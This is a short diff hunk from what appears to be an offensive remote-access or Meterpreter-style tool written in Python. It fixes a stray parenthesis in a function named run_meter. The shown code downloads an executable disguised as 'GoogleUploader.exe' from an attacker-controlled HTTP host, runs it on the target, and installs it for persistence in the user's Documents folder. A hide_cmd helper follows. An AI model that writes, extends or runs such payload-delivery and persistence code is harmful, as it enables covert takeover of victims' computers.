@@ -156,7 +156,7 @@ def run_meter(s, filename, lport=9090, lhost=HOST, httpport=8080):
     download_file(s, f"http://{lhost}:{httpport}/GoogleUploader.exe", filename)
     exe_file(s, filename)
     p("\x1b[1;36m[+]\x1b[0m Done.")
-    presistence("%HOMEPATH%erProfile%\Documents\\"+filename))
+    presistence("%HOMEPATH%erProfile%\Documents\\"+filename)
 
 
 def hide_cmd(s):
